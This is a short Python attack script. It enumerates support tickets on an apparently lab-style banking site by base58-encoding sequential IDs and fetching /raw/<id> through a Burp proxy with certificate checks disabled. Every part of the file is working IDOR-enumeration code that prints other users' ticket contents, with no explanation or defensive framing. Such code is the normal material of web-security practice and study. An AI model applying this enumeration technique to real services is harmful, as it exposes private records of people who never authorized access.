import requests
import base58
from urllib3.exceptions import InsecureRequestWarning

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Create a session object to save settings for the lifetime of the script.
s = requests.session()
s.verify = False  # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"}  # Proxy requests through Burp.

for i in range(1, 100):
    ticket = "9447:" + str(i)
    encoded_string = base58.b58encode(ticket.encode()).decode()
    response = s.get(f"https://support.quoccabank.com/raw/{encoded_string}")
    if response.status_code == 200 or response.status_code == 429:
        print(str(i) + ":", response.content)
    current = i
print(current)